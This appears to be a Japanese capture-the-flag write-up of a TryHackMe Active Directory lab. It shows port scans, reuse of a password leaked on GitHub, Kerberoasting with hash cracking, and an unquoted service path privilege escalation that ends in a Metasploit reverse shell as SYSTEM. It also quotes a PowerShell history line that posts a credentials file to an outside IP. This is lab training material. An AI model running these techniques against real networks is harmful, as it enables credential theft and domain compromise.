# Enterprise CTF

https://tryhackme.com/room/enterprise

## Enumeration

```shell
TARGET=10.48.185.249
sudo bash -c "echo $TARGET   enterprise.thm >> /etc/hosts"
```

### ポートスキャン

```sh
nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT      STATE    SERVICE
53/tcp    open     domain
80/tcp    open     http
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
3389/tcp  open     ms-wbt-server
5985/tcp  open     wsman
6005/tcp  filtered X11:5
6343/tcp  filtered sflow
7990/tcp  open     unknown
8644/tcp  filtered unknown
9389/tcp  open     adws
10950/tcp filtered unknown
11204/tcp filtered unknown
12113/tcp filtered unknown
15655/tcp filtered unknown
15665/tcp filtered unknown
16093/tcp filtered unknown
16682/tcp filtered unknown
21525/tcp filtered unknown
21660/tcp filtered unknown
26853/tcp filtered unknown
29866/tcp filtered unknown
33447/tcp filtered unknown
36976/tcp filtered unknown
41658/tcp filtered unknown
43548/tcp filtered unknown
46964/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
49671/tcp open     unknown
49673/tcp open     unknown
49677/tcp open     unknown
49700/tcp open     unknown
49704/tcp open     unknown
51696/tcp filtered unknown
54250/tcp filtered unknown
62906/tcp filtered unknown
```

```sh
nmap -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,7990,9389,47001,49664,49665,49666,49669,49670,49671,49673,49677,49700,49704 -Pn $TARGET

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-05 02:23:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7990/tcp  open  http          Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
```

開いているポート多数。

### 80

`Enterprise Domain Controller. Keep out!` と表示。  
ディレクトリ検索したが何も出なかった。

### 7990

`ATLASSIAN` のログイン画面

```
Reminder to all Enterprise-THM Employees:
We are moving to Github!
```

Googleで `site:github.com "Enterprise-THM"` を検索したら、https://github.com/Enterprise-THM を発見。

ユーザーのコミット履歴を発見。
https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/c3c239df75fefbe7563d1d29c963ba1f01e4fe5a

```
@@ -1,6 +1,6 @@
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = '[REDACTED]'
$userName = ''
$userPassword = ''
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
```

### SMB

nikのパスワードを使ってSMBで認証可能。

```sh
$ crackmapexec smb enterprise.thm -u nik -p '[REDACTED]'
SMB         enterprise.thm  445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         enterprise.thm  445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:[REDACTED]
```

```sh
$ smbclient -L //enterprise.thm -U LAB.ENTERPRISE.THM/nik
Password for [LAB.ENTERPRISE.THM\nik]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to enterprise.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

C:\Users が見えている。

```sh
$ smbclient //enterprise.thm/Users -U LAB.ENTERPRISE.THM/nik           
Password for [LAB.ENTERPRISE.THM\nik]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Mar 12 11:11:49 2021
  ..                                 DR        0  Fri Mar 12 11:11:49 2021
  Administrator                       D        0  Fri Mar 12 06:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 16:28:48 2018
  atlbitbucket                        D        0  Fri Mar 12 07:53:06 2021
  bitbucket                           D        0  Fri Mar 12 11:11:51 2021
  Default                           DHR        0  Fri Mar 12 09:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 16:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 16:16:48 2018
  LAB-ADMIN                           D        0  Fri Mar 12 09:28:14 2021
  Public                             DR        0  Fri Mar 12 06:27:02 2021

                15587583 blocks of size 4096. 9930040 blocks available
```

LAB-ADMIN 配下のPowershell履歴をダウンロード

```sh
smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> get Consolehost_hisory.txt
getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

認証情報らしきものを発見。

```sh
$ cat ./Consolehost_hisory.txt                 
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:[REDACTED]">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
```

Docs共有で2ファイル発見。パスワードはクラックできなかった。

```sh
$ smbclient //enterprise.thm/Docs -U LAB.ENTERPRISE.THM/nik
Password for [LAB.ENTERPRISE.THM\nik]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 11:47:35 2021
  ..                                  D        0  Mon Mar 15 11:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 11:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 11:45:24 2021
```

### ケルベロースティング

```sh
$ GetUserSPNs.py lab.enterprise.thm/nik:[REDACTED] -dc-ip $TARGET -request
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 10:20:01.333272  2021-04-27 00:16:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$3f68daccd427[REDACTED]
```

rockyou.txt で bitbucket サービスアカウントのパスワードクラック成功。

```sh
.\hashcat.exe -m 13100 hash.txt rockyou.txt
```

bitbucketアカウントのデスクトップでフラグ発見。

```sh
smb: \bitbucket\> cd Desktop
smb: \bitbucket\Desktop\> ls
  .                                  DR        0  Mon Mar 15 11:49:48 2021
  ..                                 DR        0  Mon Mar 15 11:49:48 2021
  desktop.ini                       AHS      282  Fri Mar 12 11:11:51 2021
  user.txt                            A       37  Mon Mar 15 11:49:51 2021
```

bitbucketアカウントでRDPに接続できた。

## 権限昇格

権限。有効になっている権限は使えない。

```sh
C:\Users\bitbucket>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

グループ。sensitive-accountグループは気になる。

```sh
C:\Users\bitbucket>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ==================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
LAB-ENTERPRISE\sensitive-account           Group            S-1-5-21-2168718921-3906202695-65158103-1115 Mandatory group, Enabled by default, Enabled group
LAB-ENTERPRISE\Password-Policy-Exemption   Group            S-1-5-21-2168718921-3906202695-65158103-1113 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

### PrivescCheck

SeAssignPrimaryTokenPrivilege 権限は悪用できる可能性があるが、Disabledになっているので使えないと思う。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ User - Privileges                                 ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user is granted privileges that    ┃
┃ can be leveraged for local privilege escalation.             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

Name                          State    Description                    Exploitable
----                          -----    -----------                    -----------
SeAssignPrimaryTokenPrivilege Disabled Replace a process-level token         True
SeMachineAccountPrivilege     Disabled Add workstations to domain           False
SeChangeNotifyPrivilege       Enabled  Bypass traverse checking             False
SeIncreaseWorkingSetPrivilege Disabled Increase a process working set       False


[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.087
```

zerotieroneserviceサービスのイメージを変更できる

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Image File Permissions                 ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
WARNING: Resolve-CommandLine failed for input: C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket
WARNING: Resolve-CommandLine failed for input: C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch


Name              : zerotieroneservice
DisplayName       : zerotieroneservice
User              : LocalSystem
ImagePath         : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\zerotieroneservice
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
IdentityReference : BUILTIN\Users (S-1-5-32-545)
Permissions       : WriteData, AppendData, WriteExtendedAttributes, WriteAttributes, Synchronize



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:12.576
```

zerotieroneserviceサービスのパスにクォートがない。

また、C:\Program Files (x86)\Zero Tier にテキストファイルを作成できることを確認。`C:\Program Files (x86)\Zero Tier\Zero.exe` を作成してサービスを開始できればSYSTEMユーザーになれる。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Unquoted Paths                         ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether there are services configured with an          ┃
┃ exploitable unquoted path that contains spaces.              ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
WARNING: Resolve-CommandLine failed for input: C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket
WARNING: Resolve-CommandLine failed for input: C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch


Name              : zerotieroneservice
ImagePath         : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
User              : LocalSystem
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Zero Tier
IdentityReference : BUILTIN\Users (S-1-5-32-545)
Permissions       : AddFile, AddSubdirectory, WriteExtendedAttributes, WriteAttributes, Synchronize

Name              : zerotieroneservice
ImagePath         : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
User              : LocalSystem
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Zero Tier\Zero Tier One
IdentityReference : BUILTIN\Users (S-1-5-32-545)
Permissions       : AddFile, AddSubdirectory, WriteExtendedAttributes, WriteAttributes, Synchronize



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.490
```

msfvenomでサービス用exeをビルドして、デプロイ、サービス開始。

```sh
net start zerotieroneservice
```

meterpreter 取得成功。

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.129.39; set LPORT 7777;exploit"

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.129.39
LPORT => 7777
[*] Started reverse TCP handler on 192.168.129.39:7777 
[*] Sending stage (188998 bytes) to 10.49.188.106
[*] Meterpreter session 1 opened (192.168.129.39:7777 -> 10.49.188.106:52078) at 2026-02-05 16:54:10 +0900

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

ルートフラグ入手

```sh
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Users\Administrator\Desktop

03/14/2021  06:48 PM    <DIR>          .
03/14/2021  06:48 PM    <DIR>          ..
03/14/2021  06:49 PM                37 root.txt
               1 File(s)             37 bytes
               2 Dir(s)  40,623,616,000 bytes free
```

## 振り返り

- 時間がかなりかかったが、ノーヒントでクリアできたので良かった。
- Powershell履歴の認証情報、Officeファイルなどはウサギの穴。
- 今回はDefenderが無効になっていたが、実際の侵入テストだとそこが最難関になりそう。

## Tags

#tags:Windows #tags:Kerberos #tags:サービス
